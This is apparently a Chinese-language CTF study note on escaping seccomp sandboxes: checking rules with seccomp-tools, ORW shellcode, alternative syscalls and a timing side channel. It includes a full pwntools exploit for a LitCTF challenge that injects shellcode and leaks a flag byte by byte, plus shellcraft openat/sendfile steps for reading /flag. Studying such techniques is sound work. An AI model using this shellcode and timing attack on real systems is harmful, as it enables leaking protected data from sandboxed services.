title: "沙箱sandbox"
date: 2025-08-06 00:00:00
categories:
  - pwn
tags:
  - sandbox

沙箱可以这个来看开没开

```Plain
seccomp-tools dump ./文件
```

看第四行是不是return kill 了是不是禁用了execve

![img](https://hnusec-star.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDhkMmJhMWRiY2YxZDEwYmFiNDE3NDUxZjk2YmEwNjNfenRXaTdZdlhYOWZqUmtaZkZnbEJzeGhKVTU0TGkzMzJfVG9rZW46V2ZkTGIwcWNrb282dWl4WjhBeWMwZ1pabkZnXzE3NTQ0NTQyNTQ6MTc1NDQ1Nzg1NF9WNA)

有的里面好像也直接有sandbox

里面或者也可以通过prctl函数调用，第二种是使用seccomp库

shellcode写到mmap分配的空间里。能写rop的话可以写。但是感觉如果写的话一般要栈迁移一下。

## seccomp函数调用

![img](https://hnusec-star.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDYxOGIxNDU0NTY0ZWViZjllMjVmYjhmMDY1MDdhMGJfRE81eHZUZzN4RE5tU0VxZGk4b0s5blY3T1FlSDJJUkFfVG9rZW46QlIxZWJCdXVFb3RHMlV4c0JoVWN2VlY1bjJlXzE3NTQ0NTQyNTQ6MTc1NDQ1Nzg1NF9WNA)

一般是这四个

### 第一个是返回地址

### 第二个是一个宏

> SCMP_ACT_ALLOW(0x7fff0000U)
>
> SCMP_ACT_KILL( 0x00000000U)

有的不知道为啥它跟图片里写的是0LL

有的写的是这个 0x7FFF0000LL

### 第三个是调用号

不同的有不一样的调用号

read-->0  write-->1  open-->2  exit-->60

### 第四个是对它的操作

> 参数为0表示白名单模式
>
> 参数为0x7fff0000U则为黑名单模式

0的话就没有操作。0LL就是不做限制。

## 有orw

一种就是写shellcode。asm也行，手写也行

另一种如果空间够的话或者栈迁移比较好做的话我们也可可以构造rop链来用orw.就是跟libc差不多，用基地址算出来这三个函数的地址，最后覆盖一下。

## 有or没有w

用爆破判断

## 有rw没有o

> #### 可以借助fstat()->利用retfq汇编指令切换至32位调用open

实际上利用了fstat这个函数

和retf汇编指令

## 没有ow只有r

> read,mmap，但是又fstat，所以可以解决没有open的情况，没有write可以利用loop循环，用cmp卡住程序，从而进行单字节爆破得到flag

结合上面两个

- 对于 `open`，我们可以选择使用 `openat` 或者 `openat2`
- 对于 `read`，我们可以选择使用 `readv`、`preadv`、`preadv2`，`pread64` 或者 `mmap`（本题可用）
- 对于 `write`，我们可以选择使用 `writev`，`sendfile`等

注意在使用 shellcraft 时需恢复 `rsp` 寄存器

# 沙箱的侧信道

> 当目标程序被沙箱（Sandbox）严格限制，无法直接调用 `execve` 或者关闭了标准输出，使得无法正常泄露 `flag` 明文时，通过分析程序在接收不同输入后所表现出的微观反馈（如程序崩溃、进入死循环、时间差等），从而逐位、逐字符地“盲猜”出 `flag` 内容的一种技术手段。

沙箱里read open都有，没有write.这个时候我们没有办法通过row来读取打开写出flag.

## 基本的方法

一，比较

1.由于read open又都存在，我们可以利用这个东西。flag会读到，也可以打开flag。

2.我们可以通过尝试的方法来利用open来逐个比较flag里面每个字符(cmp)

3.对了就返回exit。如果错了就继续loop循环。

二.比较时间

或者比较时间。因为比较之后对了和比较之后错了时间不一样。这两种方法来判断是不是试对了。

就是你用shellcode的形式来调用read open 和比较（就是要用shellcode来调用那些寄存器或者执行操作之类的来绕过这个禁用掉write的特殊的沙箱）

​     前提条件是你能格式化字符串或者溢出。就是给shellcode机会。然后sandbox又比较特别。又是上面那种情况。就可以考虑这种，不考虑算法，来侧面利用比较正确或错误时间不同这种侧面的方式。来进行猜测flag

## 流程

1.就是先初始化，

2.写一段 o+r+ 比较 的shellcode,

3.然后再在底下添加判断正确或错误的函数。

这个是模板，单字节比对示例：

```C
mov al, [flag_addr + offset]      ; 读取实际 Flag 字节
mov bl, guessed_char              ; 将猜测字节载入
cmp al, bl                        ; 比对
jne wrong                         ; 如果不相等则跳转到 wrong
; 相等：进入死循环或耗时路径
jmp in_loop
```

## 一道题

下面看一下这个litctf里的侧信道

暂时无法在飞书文档外展示此内容

看一下沙箱

![img](https://hnusec-star.feishu.cn/space/api/box/stream/download/asynccode/?code=NmY5ZmQ4M2UxMDAyOTAzZDQxZmVlNTAyMTQ0NGNjMGFfaDk0UVl0Wm1jbzRQRzVTZGNHbUY0YndmdE5aUU51dmFfVG9rZW46TG0zQWJwWm45b1pKRmV4Yk9LTmNvaXZwbkFlXzE3NTQ0NTQyNTQ6MTc1NDQ1Nzg1NF9WNA)

这个标志比较明显。就没有write了。没有write的情况下我们想要绕过沙箱。就要考虑这个侧信道的方法

IDA逆向一下函数

![img](https://hnusec-star.feishu.cn/space/api/box/stream/download/asynccode/?code=MDQ0MTA5ZDBhMDkyNTRhNTUzMjQ2YzRmNTkxODFkMzhfQ1RFMXJPTElkWFBqdUl2NEdkdlA4T2lGbEl4NERNWEJfVG9rZW46V2FnQ2JOOW1XbzFZSU54RkxISWNlTjhIbmdiXzE3NTQ0NTQyNTQ6MTc1NDQ1Nzg1NF9WNA)

这的mmap是用来分配内存的。里面的34是flag.它映射了0x1000

主要是这个。read读0x100，到buf，把buf当成指针。主要就是利用这个

```C
read(0, buf, 0x100);
((void (*)(void))buf)();
```

写shellcode时注意不要超0x100

```Python
from pwn import *
import time, statistics, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "challenge.host"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 31337

context.arch = "amd64"
context.log_level = "error"  # change to 'debug' for verbose I/O

FLAG_ADDR = 0x404040  # <-- change to real flag address
LOOP_CNT  = 0x800000  # ≈20 ms on most VPS; calibrate!  

print(f"[+] Target  : {HOST}:{PORT}")
print(f"[+] Flag @  : 0x{FLAG_ADDR:x}\n")

def make_probe_sc(index: int, guess: int) -> bytes:
    """Return assembled probe shellcode for flag[index] == guess."""
    asm_template = f"""
        mov     rbx, {FLAG_ADDR}
        add     rbx, {index}        ; rbx = &flag[index]
        movzx   eax, byte [rbx]     ; al  = flag[index]
        cmp     al, {guess}         ; compare with guess
        jne     wrong               ; if not equal – skip delay
correct:
        mov     rcx, {LOOP_CNT}     ; long busy-loop for timing leak
pause:
        dec     rcx
        jne     pause
wrong:
        xor     edi, edi            ; exit(0)
        mov     eax, 60
        syscall
    """
    sc = asm(asm_template)
    assert len(sc) <= 0x100, "shellcode too large"
    return sc.ljust(0x100, b"\x90")  # pad with NOPs to full read length


def send_probe(index: int, guess: int) -> float:
    """Send probe and return measured RTT in seconds (average of 3 samples)."""
    samples = []
    for _ in range(3):
        io = remote(HOST, PORT)
        # sync – wait for banner & prompt
        io.recvuntil(b"Please input your shellcode")
        io.recvline()  # consume trailing newline, if any
        payload = make_probe_sc(index, guess)
        start = time.perf_counter()
        io.send(payload)
        try:
            io.shutdown("send")  # EOF -> let target finish
        except OSError:
            pass
        try:
            io.clean(timeout=0.10)  # drain any leftover output quickly
        except EOFError:
            pass
        elapsed = time.perf_counter() - start
        io.close()
        samples.append(elapsed)
    return statistics.mean(samples)


def brute():
    printable = list(range(32, 127))  # space..~
    flag = bytearray()
    idx  = 0
    while True:
        base = send_probe(idx, 0)  # definitely wrong byte → baseline RTT
        found = False
        for g in printable:
            t = send_probe(idx, g)
            if t - base > 0.015:   # threshold: tune if network chilliest
                flag.append(g)
                print(f"[+] flag[{idx}] = {chr(g)} (Δ {t - base:.3f}s)")
                idx  += 1
                found = True
                break
        if not found:
            break  # reached ‘}’ or probe failed – stop
    print("\n[!] FLAG =", flag.decode(errors="ignore"))

if __name__ == "__main__":
    brute()
```

# shellcraft.sendfile

在构造 shellcode 时，`shellcraft.openat()` 方法封装了 `openat()` 系统调用，通常接受以下四个参数：

**`1.dirfd`****（目录文件描述符）：指定路径解析的起始目录。**

 

`-100` 是一个特殊值，表示 `AT_FDCWD`，即当前工作目录。

1. 在某些情况下，`-100` 可能用于绕过沙箱限制。

**`2."/flag"`** **是目标文件的路径。**

**`3.flags`****（打开标志）：指定文件的访问模式和行为。**

 `0` 表示只读模式。

**`4.mode`****（模式）：指定新文件的权限。**

1. `0` 表示不设置权限，通常在文件已存在时使用。

# shellcraft.sendfile

在构造 shellcode 时，`shellcraft.sendfile()` 方法封装了 `sendfile()` 系统调用，通常接受以下四个参数：

**`0.out_fd`****（输出文件描述符）**：指定数据发送的目标文件描述符。

- 在攻击脚本中，`1` 表示标准输出（stdout）。

1. **`in_fd`****（输入文件描述符）**：指定数据来源的文件描述符。
   1. 在攻击脚本中，`3` 是之前通过 `openat` 打开的 `/flag` 文件的文件描述符。
2. **`offset`****（偏移量）**：指定从输入文件中读取数据的起始位置。
   1. 在攻击脚本中，`0` 表示从文件的开始处读取。
3. **`count`****（字节数）**：指定要读取的字节数。
   1. 在攻击脚本中，`0x100` 表示读取 256 字节。

通过此调用，可以将 `/flag` 文件的内容输出到标准输出，从而绕过沙箱限制，获取 flag。
